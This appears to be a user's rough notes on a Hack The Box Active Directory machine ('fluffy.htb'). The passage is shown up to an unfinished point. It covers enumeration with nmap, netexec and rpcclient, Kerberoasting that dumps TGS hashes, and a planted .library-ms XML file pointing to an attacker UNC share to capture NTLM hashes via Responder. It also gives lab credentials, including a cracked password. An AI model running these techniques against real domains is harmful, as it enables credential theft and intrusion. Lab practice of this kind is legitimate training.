j.fleischman:J0elTHEM4n1990!

## NMAP SCAN
```
nmap -sSCV -p- 10.129.22.39                                  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-22 21:52 +0700
Nmap scan report for 10.129.22.39
Host is up (0.071s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-22 21:55:37Z)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-04-22T21:57:09+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-04-22T21:57:09+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-04-22T21:57:09+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-04-22T21:57:09+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
49712/tcp open  msrpc         Microsoft Windows RPC
49732/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m01s, deviation: 1s, median: 7h00m00s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-04-22T21:56:31
|_  start_date: N/A

```

nothing in smb.... 
i was wrong.... use netexec too to confirm 
```
netexec smb 10.129.22.39 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares --smb-timeout 10
SMB         10.129.22.39    445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.22.39    445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
SMB         10.129.22.39    445    DC01             [*] Enumerated shares
SMB         10.129.22.39    445    DC01             Share           Permissions     Remark
SMB         10.129.22.39    445    DC01             -----           -----------     ------
SMB         10.129.22.39    445    DC01             ADMIN$                          Remote Admin
SMB         10.129.22.39    445    DC01             C$                              Default share
SMB         10.129.22.39    445    DC01             IPC$            READ            Remote IPC
SMB         10.129.22.39    445    DC01             IT              READ,WRITE      
SMB         10.129.22.39    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.22.39    445    DC01             SYSVOL          READ            Logon server share 
```

```
smbclient //10.129.22.39/IT/ -U 'j.fleischman%J0elTHEM4n1990!'                       

Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Apr 23 05:08:50 2026
  ..                                  D        0  Thu Apr 23 05:08:50 2026
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 22:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 22:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 22:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 22:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 21:31:07 2025

                5842943 blocks of size 4096. 1572375 blocks available
smb: \> get Everything-1.4.1.1026.x64.zip 
getting file \Everything-1.4.1.1026.x64.zip of size 1827464 as Everything-1.4.1.1026.x64.zip (287.3 KiloBytes/sec) (average 287.3 KiloBytes/sec)
smb: \> get KeePass-2.58.zip 
getting file \KeePass-2.58.zip of size 3225346 as KeePass-2.58.zip (2488.0 KiloBytes/sec) (average 659.9 KiloBytes/sec)
smb: \> get Upgrade_Notice.pdf 
getting file \Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (530.3 KiloBytes/sec) (average 654.7 KiloBytes/sec)
```

got some files lets check them 
got multiple CVE's which can exec on the machine... but first lets enum more

```
rpcclient -U 'fluffy.htb/j.fleischman%J0elTHEM4n1990!' 10.129.22.39

rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[ca_svc] rid:[0x44f]
user:[ldap_svc] rid:[0x450]
user:[p.agila] rid:[0x641]
user:[winrm_svc] rid:[0x643]
user:[j.coffey] rid:[0x645]
user:[j.fleischman] rid:[0x646]
```

got users..
```
faketime "$(ntpdate -q 10.129.22.39 | cut -d ' ' -f 1,2)" impacket-GetUserSPNs -request -dc-ip 10.129.22.39 'fluffy.htb/j.fleischman:J0elTHEM4n1990!'

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName    Name       MemberOf                                       PasswordLastSet             LastLogon                   Delegation 
----------------------  ---------  ---------------------------------------------  --------------------------  --------------------------  ----------
ADCS/ca.fluffy.htb      ca_svc     CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 23:07:50.136701  2025-05-22 05:21:15.969274             
LDAP/ldap.fluffy.htb    ldap_svc   CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 23:17:00.599545  <never>                                
WINRM/winrm.fluffy.htb  winrm_svc  CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-05-18 07:51:16.786913  2025-05-19 22:13:22.188468             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*ca_svc$FLUFFY.HTB$fluffy.htb/ca_svc*$bd443ee9ba5299a48e373cfc23220251$a7c9ea7082bda0b5d7b03f196990d2d2f6ba0b37660327e0766abc6a08b7facf1b0590492804ae8817a7fb16da03d34a0d657e0a80330a4f076c43bddbda86d887bf7bfab63533831de6c7c45cdac3109f72f3eedb2493597298a576f4a02973572a31d88cd3cf8b0846476852360b2a15fba08a192dccdb1eca201af0f552db82ca0028fbaf347ff140c206d17bb2bbf3beabf86498fc82b53adc2f75d5d2bd7c89c637b151f59dd13ba81859bb2c57e8c6e76c4229a96d8456e5964bd91aec10ada8108b438c00a4004bae751cac0781adea3b98aa23c20137abb490181d9b8286462c3066e8cfc3ca669045a9fa471ef229f18c0219521567ab46af7fd4ea10d00435e7a26ad8a0e55763e342c839f3881b731a205a63468b8ce5d6650a456885adcb2e717ab04354f4063f207cfd3b8216992d2ca188604dc76f0de818d7837f0b37717479c044df7364dad509febb6c9e3bddd80ba18740708b31c7a46f9eff716de4cb71a5eb825c20ab57bfd1c5316cf918be35987f12594bee26ece41ac12e36a74f7122628a1ad26d3258468a22cf9282efea0bb802b4db3e2aaa4bde38e0b2bc24d20fab894644f24100650d2c99ac4a02fa8eda0b97542e5ff79ad4e96db9a50da13953c7b56bcb080d67d1b0e3744af52e766f61d402a590c4a079e17afcdb6e15829cf51f82c8d26e4a2f3b3c2468966910dc4a39bd7a96807a91f6098d96586669c84217e4e24d4bfe02efec533fb5b118e20babc591c4f6bb4051aab0161bba3451e79b8ea61a635369be10c936ad5ebadf7ebfe196b7194586e9744d2bca9fe7c134c3d8d36db93e71b24540d745fdb7950e47f0ffeeef048934afa361148e1c7d565fa8f3371b7bdcd7f7afecb09a180106b7a42ada2bd880ba27f99a91c6a95263b09b3e81b1d386a3008071fdefb5e1300c1f1ef924d69436a329148fe0f7e537d5e1924c7b39d51eebba2be7d520a0027ec7fc2ef5818a9f2edb42d28c740c611ca77e4afc9bea9454ccb87a07f93b7349e2f7b5b94e83fa0339ca5a270a3b80b9ba51cb41270b9e9779e13d2645885afa581531ab016c231e60c73516896f8a5f55f677765b05f23376afbf2935e13049d1a5c159bcf71abc2bcb717fc09cd5136e0d70225d6fcf1e31f2ac43069bc9c015579418acda1e675a085852e07d5f12967e3553c6dbc7f2e036348e0bb9ca38cc50eed329e618575044c649c3744bff8aa2102b646a8f4e00c5db445337f5fb315feb4b83defdadbd092e276a76890f7ec5a5947a827a2cad073103c284f51aef76f4ffb30e257c3d55f1878828a578c7de8be243c248ec5189b47be031cc0432e50d538213d1df28a2e1ff1f278837ca63a59594b42278be64458abc1e4f7eae802b5e46f106e57d1cc03abc50f2a4786f73fb3f1044b5b0fbee106c37e14b41fad15cd582a8f6f47f4e9d26e4a9b1167fcfc140d664656dc35b68a3202b500f65deb8d121083aacacc3e8f276f8d90fe825ad97ccda0498388af407b7cb9dd68ede7a16f8b1ae42d125ab

$krb5tgs$23$*ldap_svc$FLUFFY.HTB$fluffy.htb/ldap_svc*$80bcdf65e88e398a92d15f86b7709a2b$b15ed8b4bc9107ea412bb9f7dcff2b2eda8db8eb1bc6b924a09524540f6e5defb6f349f39ef7e627303c6f4daa5a0ab42bb4564330b2eb1f162d1479a0ab9f852d5f622719f8e43460e544383b4d700e628cb02c0cd9241409d7f90840336e0a71423ea689d6f2f7913fdddbb4aa61744859c7b69c699d1703524bf4be815db70bc950e5d51319d149427df23f2c8c03e5c5b61313bf52b25eb2433d1f38a666c207306f84575ecd2ce0efc4aa091da2efd6da02df0dd6ed45145f8f5f16a3ed86121b560a1a235c16f1c69ea336058150227c67d4b8c612226f2b03a2ecfa83915016fd04ff6f423ac2a9f04f16a0637fee8dc7df9af86e838a512f54e1b1cc9de604859518e6c4a041d540e4b01cb144d4c7f6fa1944eae6cc263ef7e6ad217fd332fad9e072a2ac23f6d9d0c3ff54769f5050ea19bf409f903a897b04043da6ed06a99de222433a78234ec7e47372f11fac8a274a012d048652528cd15301bbd2b7478f55adc7a691760262aacca0959417eaf2f707d0e9643d49da2e0c800878cd95226542978915a6de938a122699b5f4ded6da7664ad360afe085e7b27e228527dd468ab3c05abf6496cd37c9afcd1fce0e71d090bdfa3171ca8c20265565a1fc61718fcfd5cac77f248f100c719681426abe85d099f9293318c80a206c7c64510f15825d2f3737e31f1a21aafee17bcd185008b936949c5065f9abfa1774129f11c84e192b198f3c87263ddf8cf1823339e209f0ce516ae388382e4746b7fffa412f54400e00b445bd27a3a5a7a587f24d517009ea2e04ff2b9d11f23a3be107c4c89b1c3e7dbf06e23150da0ca0bdafe1115ec696a0c540840fa9a82e3f6676658b168b46784b03e88aa74745681a43c6bea94553f9bf4c91e300eaec26fdd4aa43c50a206509777d1d5bf97a52d9a858d39293c4cb5e5a6712aa0299e2ad6dad03ad2e3448b5e965935698a7a2c5698d40a447a6ba27f9321a16f5879f88848cbb4fd2a8f455c4243645081f291d25c0d6f42f177094f64877086b64c588a035ca0a8aca0ada7d5f401c5c04b08d73176ef3415293423905ede4e4ff489e5c11f4d62439268cc36f4a5b8ba68abcea5b0c652d07e159d9388496ef9b925067368b4c59dcfd6a547d25459a35fd0b703b5eb898f71305639a0b46033648854f74b6a65a0d324f39e2eef7942623e9f0929695ab2d7a053f3642e57c7587013b0757dc82f7932e4e900be39516af710a8744fa95783176e953bf7378c5e992b5c37844daec75efa25f0d28f01566e415f6e6136e9388d3594274ea57139add279a70bf4d0b6fadce458e94ebcb17693c07a37d37dc3c5424219234f3cd7f931eb7b02a0bd175bd8503fc4dd17b960377bdf0196d245432841e25815c94838764cc059e6210c5395b13363e26c8da257429d799f3c3f167558d394e824dfc612a474a56ace3a3127bde925496b70d65097c9fa49af3637772ab744f493b69af8949be079def991096f668c42b7c439e891d836bc0bdd53f9db7a1f01bf5003ea2d2e24db

$krb5tgs$23$*winrm_svc$FLUFFY.HTB$fluffy.htb/winrm_svc*$ed6ed82f7bf751741361410df2d9f463$04e28f7b40e54aa11cf172a98efc46646e87878de5a80bb46462622f53d0fb671b69efdee35fca65c87b29033f6711f2d636f8fade604b31a0568c432a1c257d8dbc13f1a3cffbd5af6bf79e7dd09ae3cb01a0532fc0789c128f752fc1a54906d4dd9a516402834624f8fa1c3bb11c513607e1f0a22819f8b28426c62e232ff8c64787b7f693057942d37444c29e5dd7cd66aacd627d990d70667ac52cd4b001c2f3a4bb1904cc273ce5357481f317142d1f80bf14cab39c4e5829ff39544fb9b152ab69e27bfefb9f96a69b747e1f8e74f191ddd11aa671a39988a3b380f2b372db2ad848adeab305cd4ab3d4833ecb75de34b006877cd5e55c27a3350d5f599903ed2abaa2076c177afd0f7504bb2faa117a383abc34dccdbf7c1e2e94d733b6ab223be833da3facc1edb62b50f1c1b24f0d8611d73d4271d0fdce6c650a7ab3af746d7efbe04c1d24be11ee672341377d528591c4936351ddc4c98739dc2b93d8ce9313066553cf359f9d617d5c481504f2af6fa61f7f3c67cd2038228b8ce3f6c3939b6a64dbaeb9cba18706264766e7bcdf2bb2def80adcd159f58219d08cef0de2446ad43aed9f61efe9a178688cd90e528a4d7730aead34776c3d6dbe2cf5cdfe16f385b27678afce109b2d400aa800fde7384b5ee23475ed99b309bc414211d462ff650729f4c38f4524e09df51937f277afaba7ca964687f4b91bf862e1e4efa752b65e15e601b3cfdd45629c053a9f77042d7c0e5d421572935284ea0edc1cac22366396e1696621158ce8a68e020c8503e29d7e7ffd8a8bd282d8b01d2340ca2601796c670686bc16e067bd2536c69a552170ff878af6a7b5bd9cf5aa6d2180ddad217142cbf51976ed58321d2417b8c194e3eae2063957f6c87f1280304150e70e240589dfcf2977d354f2509d52884ffc429ad0ded137c330e28a526b75ae4b225a84afb05d070a00a35ef780431acb720b36576d59b43851c9b66469d0b78b52bb53cc0b78ee6c01b3733d4cc4b3969d70815a6931ef82a280ed47de610aa7ebee0ca81df9efb180349998354dd2c8275a28ccff571d9a942b14ccb1c735eadada84f3ef7d6e085a910eefde653299a9be7d0745ac2e1304b1941dfc49cb991a548056efbf314ecd74e5ce932b2d355caa7937b3ed51b1bf9aa446a557adced3be8e87b878f4ba3a5a5c70c9f4a9b5cf4547fc031c629157c1e3eff2831984f8e66282ed44b3f8b5e5fd1790cb8a030295052be5a15e72e00d1b6d788c29dc7f85dfb79575752e72d12c1a77e1dfe876512f3a435d1322f8d34405c4ae83658f537e9b8a9b421d5d28af5abf9cee0119937f0a55df64f87bf0932baf50f9f0ba22ed1c10e70057301b85f486c9c436bacff0358ed4dea70d054814a912aadfb03c5caa9ef4cdec59fdfe086a222037eff42e242ea6f5b7eb6b59b6b4ea8a5b887137b68a43f13b5222aa4eb931407322d97fbe3235b88d287320c8b3282b48c0f007ffe77071c4049707d7bf9eafa70eeb5b054a0de66c229101b702ed39a6d5
```

in IT group we have read and write permission maybe we can upload some exploit and get ntlm hash on responder

```
[SMB] NTLMv2-SSP Client   : 10.129.22.39
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:4f5ed68cd7a7c53c:4B6C17F18D3BA87815ED4B6B41F8821C:010100000000000000A831EDAAD2DC01FBADA3D49E12A2CB000000000200080058004D0059004D0001001E00570049004E002D00450053004F004D00360047005A004B004D003100480004003400570049004E002D00450053004F004D00360047005A004B004D00310048002E0058004D0059004D002E004C004F00430041004C000300140058004D0059004D002E004C004F00430041004C000500140058004D0059004D002E004C004F00430041004C000700080000A831EDAAD2DC0106000400020000000800300030000000000000000100000000200000AE0703F68F07210D53271BA83F267ACCD9903CC29DD0C7D6EDF76106B009EE8E0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00350033000000000000000000
```

got the ntlm, but remember to put the file as a zip and can also put as .library-ms 

the exploit being: 
```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://microsoft.com">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>true</isSupported>
      <simpleLocation>
        <url>\\YOUR_IP\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>

```

lets crack the hash 
```
P.AGILA::FLUFFY:e7a56c502b0fc9fb:69dc7848cbfa32bed8f8c63668f17c04:010100000000000000a831edaad2dc01ef9f2f3ea6835198000000000200080058004d0059004d0001001e00570049004e002d00450053004f004d00360047005a004b004d003100480004003400570049004e002d00450053004f004d00360047005a004b004d00310048002e0058004d0059004d002e004c004f00430041004c000300140058004d0059004d002e004c004f00430041004c000500140058004d0059004d002e004c004f00430041004c000700080000a831edaad2dc0106000400020000000800300030000000000000000100000000200000ae0703f68f07210d53271ba83f267accd9903cc29dd0c7d6edf76106b009ee8e0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00350033000000000000000000:prometheusx-303

```
p.agila:prometheusx-303

lets try to get TGT for every account we found TGS for... 
ca_svc is a rabbit hole......